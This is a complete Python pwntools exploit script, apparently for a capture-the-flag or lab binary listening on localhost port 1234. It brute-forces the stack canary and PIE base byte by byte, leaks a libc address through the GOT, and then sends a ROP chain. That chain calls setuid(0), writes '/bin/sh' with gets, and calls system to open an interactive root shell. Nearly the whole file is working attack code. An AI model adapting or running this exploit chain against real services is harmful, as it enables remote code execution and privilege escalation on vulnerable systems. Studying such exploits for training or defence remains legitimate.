#!/bin/python3

from pwn import *

CANARYOSET = 40
RETOSET = CANARYOSET + 16 

HOST = "localhost"
PORT = 1234 

PRINTFPLTOSET = -0x4a0  # -0x430
PRINTFGOTOSET = 0x2b40  # 0x2b78
POPRDI = 0x143
POPRSI = 0x141

SYSLIBCOSET = -0x2ccd0
EXITLIBCOSET = -0x37480
SETUIDLIBCOSET = 0x55ea0
GETSLIBCOSET = -0xa80

# generic brute forcer
def brute_force(host, port, buf, test, found, p):
    if not found: found += 1

    for i in range(0x100):
        if chr(i) == '\n':
            continue

        target = remote(host, port) 
        target.sendline(buf + p8(i))
        res = target.recv(timeout=1)

        if test(res):
            for check in range(10):
                context.log_level = 20
                p.status(f"Checking {buf[-found:] + p8(i)} ... {check+1} of 10")
                context.log_level = 100
                target = remote(host, port) 
                target.sendline(buf + p8(i))

                # give it time to respond
                sleep(0.5)
                res = target.recv(timeout=2)

                if not test(res):
                    break

                if check == 9:
                    return buf + p8(i)

        context.log_level = 20
        p.status(f"found {found} of 8 {buf[-found:] + p8(i)}")
        context.log_level = 100

        try: res2 = target.recv(timeout=1)
        except KeyboardInterrupt:
            exit()
        except:
            pass

        target.close()

    return None


def main():

    ## buffer, exit to return, 38 bytes to canary
    buf = b"exit" 
    buf += b"A"*(CANARYOSET-4)
    restart = buf

    ## pretty status updates
    p = log.progress("Brute forcing canary ")
    context.log_level = 100

    ## brute force canary
    canary_test = lambda x: "stack" not in str(x)
    while True:

        # found canary
        if len(buf[CANARYOSET:]) >= 8:
            p.success(f"Cannary is {hex(u64(buf[-8:]))}")
            break

        # takes a while!
        buf = brute_force(HOST, PORT, buf, canary_test, len(buf[CANARYOSET:]), p)

        # restart on failure
        if buf == None:
            p.failure("Somthing went wrong")
            buf = restart
            p = log.progress("Brute forcing canary ")

    ## log
    p = log.progress("Brute forcing PIE ")

    ## payload with canary, padding, offset of a signal we can use 
    restart = pay = buf + b"\x00"*8 + b'\xe0'   # 'D\x01\xe7\xc6U\x00\x00'

    # brute force the address of main
    PIE_test = lambda x: "server error!" in str(x)
    while True:

        # broke PIE
        if len(pay[RETOSET:]) >= 8:
            p.success(f"Broke PIE! {hex(u64(pay[-8:]))} -> no()")
            break

        pay = brute_force(HOST, PORT, pay, PIE_test, len(pay[RETOSET:]), p)

        # restart on failure
        if pay == None:
            p.failure("Somthing went wrong")
            pay = restart
            p = log.progress("Brute forcing PIE ")


    ## .text leak
    basic, text_leak = pay[:-8], u64(pay[-8:])

    ## calulate real addresses from leak
    pop_rdi = text_leak + POPRDI
    pop_rsi = text_leak + POPRSI
    printf_plt = text_leak + PRINTFPLTOSET 
    printf_got = text_leak + PRINTFGOTOSET 
    writable = text_leak + PRINTFGOTOSET + 0x100      # the GOT table is writable :)
    context.log_level = 20
    log.success(f"puts function plt address : {hex(printf_plt)}")
    log.success(f"puts function GOT address : {hex(printf_got)}")

    ## payload to leak libc address of printf
    leak_printf = basic
    leak_printf += p64(pop_rdi)
    leak_printf += p64(printf_got)
    leak_printf += p64(printf_plt)

    ## try call puts to with GOT entry to get its libc address
    log.info("Calling puts plt with:\n\t rdi = puts GOT")
    log.info("Should respond with puts real libc address")
    t = remote(HOST, PORT)
    t.sendline(leak_printf)
    sleep(1)

    ## split response (possible race condition)
    echo, puts_libc = t.recv(len(leak_printf)), t.recvuntil(b'\n')

    ## parse leak
    print(puts_libc)
    puts_libc = puts_libc.strip(b'\n')
    puts_libc += b"\0"*(8-len(puts_libc))
    log.success(f"puts libc = {hex(u64(puts_libc))}")
    log.success(f"Broke ASLR!")

    ## calculate libc addresses from leaked puts
    sys_libc = u64(puts_libc) + SYSLIBCOSET
    setuid_libc = u64(puts_libc) + SETUIDLIBCOSET
    exit_libc = u64(puts_libc) + EXITLIBCOSET
    gets_libc = u64(puts_libc) + GETSLIBCOSET
    log.success(f"gets libc address   : {hex(gets_libc)}")
    log.success(f"exit libc address   : {hex(exit_libc)}")
    log.success(f"setuid libc address : {hex(setuid_libc)}")
    log.success(f"system libc address : {hex(sys_libc)}")

    ## FINAL STAGE 
    log.info("Call setuid with:\n\t rdi = 0") 
    root_shell  = basic
    root_shell += p64(pop_rdi)
    root_shell += b"\0"*8 
    root_shell += p64(setuid_libc)
    log.info("Call gets with:\n\t rdi -> known writeable address") 
    root_shell += p64(pop_rdi)
    root_shell += p64(writable)
    root_shell += p64(gets_libc)
    log.info("Call system with:\n\t rdi -> known writeable address (now containing /bin/sh)") 
    root_shell += p64(pop_rdi)
    root_shell += p64(writable)
    root_shell += p64(sys_libc)
    log.info("Call exit with:\n\t rdi -> 0 for clean exit") 
    root_shell += p64(pop_rdi)
    root_shell += p64(0)
    root_shell += p64(exit_libc)

    ## send payload 3
    t = remote(HOST, PORT)
    t.sendline(root_shell)

    ## gets /bin/sh into writable GOT table
    log.info("Send /bin/sh to gets")
    t.sendline(b"/bin/sh\x00")

    ## test shell 
    t.recv(timeout=0.5)
    t.sendline(b"whoami")
    user = str(t.recv(timeout=0.5))[2:-3]
    log.success(f"You got a shell with username '{user}'!")
    
    ## give shell
    t.interactive()


if __name__ == "__main__":
    main()

